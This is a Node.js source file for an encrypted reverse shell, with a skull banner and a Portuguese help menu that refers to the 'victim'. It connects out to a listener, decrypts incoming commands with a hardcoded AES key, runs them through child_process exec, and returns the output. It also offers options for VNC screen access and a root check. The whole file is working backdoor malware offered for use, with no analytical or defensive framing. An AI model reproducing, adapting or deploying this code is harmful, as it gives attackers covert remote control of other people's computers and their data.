const net = require("net");
const process = require("process");
const { exec } = require("child_process");
const CryptoJS = require("crypto-js");

const banner = `
. ╔═══════════╗
  ╔═╝███████████╚═╗
╔╝███████████████╚╗
║█████████████████║
║█████████████████║
║█████████████████║
║█╔█████████████╗█║
╚╦╝███▒▒███▒▒███╚╦╝
╔╝██▒▒▒▒███▒▒▒▒██╚╗
║██▒▒▒▒▒███▒▒▒▒▒██║
║██▒▒▒▒█████▒▒▒▒██║
╚╗███████████████╔╝
╔═╬══╦╝██▒█▒██╚╦══╝.▒..
║█║══║█████████║ ...▒.  
║█║══║█║██║██║█║ .▒..
║█║══╚═╩══╩╦═╩═╩═╦╗▒.  
╔╝█╚══╦═╦══╦╩═╦═╦═╩╝
╔╝█████║█║██║██║█║
║██████║█████████║
`

const help = `
help, ?                 mostra esse help
info                    retorna informações do alvo
vnc                     retorna conexão com interface grafica (x11vnc)
root-info               verifica se a vitima tem root
`

function decrypt(text) {
    let bytes = CryptoJS.AES.decrypt(text, "hackingworld");
    let msg = bytes.toString(CryptoJS.enc.Utf8);
    return msg;
}

function encrypt(text) {
    let msg = CryptoJS.AES.encrypt(text, "hackingworld").toString();
    return msg;
}


const LHOST = "127.0.0.1";
const LPORT = 6661;

var client = new net.Socket();
client.on("connect", (sock) => {
    client.setEncoding("utf8");
    client.write(encrypt(`${banner}\r\n`));

    client.on("data", (data) => {
        var msg = decrypt(data);
        console.log(msg);
        if (msg == "help" || msg == "?") {
            client.write(encrypt(help));
        } else if(msg.indexOf("cd") != -1) {
            let newData = msg.replace("cd", "").trim();
            try {
                process.chdir(newData);
                exec("pwd", (error, stdout, stderr) => {
                    if (stdout) {
                        client.write(encrypt(`open directory: ${stdout}`));
                    }
                    if (error) {
                        client.write("");
                    }
                    if (stderr) {
                        client.write(encrypt(stderr));
                    }
                });
            } catch {
                client.write(encrypt(`\ndiretorio \"${newData}\" não encontrado\n`));
            }
        } else {
            try {
                exec(msg, (error, stdout, stderr) => {
                    if (stdout) {
                        client.write(encrypt(stdout));
                    }
                    else if (error) {
                        client.write(encrypt(error));
                    }
                    else if (stderr) {
                        client.write(encrypt(stderr));
                    } else {
                        client.write(encrypt(`[+] ${msg} [+] OK\n`));
                    }
                });
            } catch {
                sock.write(encrypt(`[-] comando ${msg} [-] ERROR\n`));
            }
        }
    });
});
client.on("close", () => {
    console.log("desconeted!!!");
});

client.on("error", () => {
    console.log("error");
});

/*function intervalFunc() {
    client.connect({ host:LHOST, port:LPORT });
}*/

//setInterval(intervalFunc, 1500);

client.connect({ host:LHOST, port:LPORT });
